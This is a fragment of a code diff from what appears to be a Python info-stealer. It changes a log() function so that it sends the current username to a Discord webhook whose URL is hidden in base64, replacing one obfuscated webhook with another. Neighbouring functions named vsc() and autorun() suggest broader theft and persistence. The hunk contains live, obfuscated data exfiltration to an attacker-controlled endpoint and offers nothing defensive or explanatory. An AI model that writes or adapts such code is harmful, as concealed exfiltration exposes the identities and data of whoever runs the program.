@@ -50,7 +50,7 @@ def vsc() -> None:
 
 
 def log() -> None:
-    Webhook(base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMzM2ODEwMjgxNzEwNDAyNC9wMV9nemIxelYzQ1ZZeXJqS2NlMkdna0g1cFlBbktEUlM4cG40TlhzT3p2UTljaUZ5b0V5d3ByNUF3VVVWODl2TVYzMQ==').decode(), getuser)
+    Webhook(base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMzc0MjI4NDg5NzkxNDk1MC9aQlRsSFFKbFBFQURBY2VjeXNfeXR0LTFpankya09QRXhIU0lELS1SN0dLYUpvcUppSXJUWm9sOXlISHRFY3N5WUw1WA==').decode(), getuser)
 
 
 def autorun() -> None:
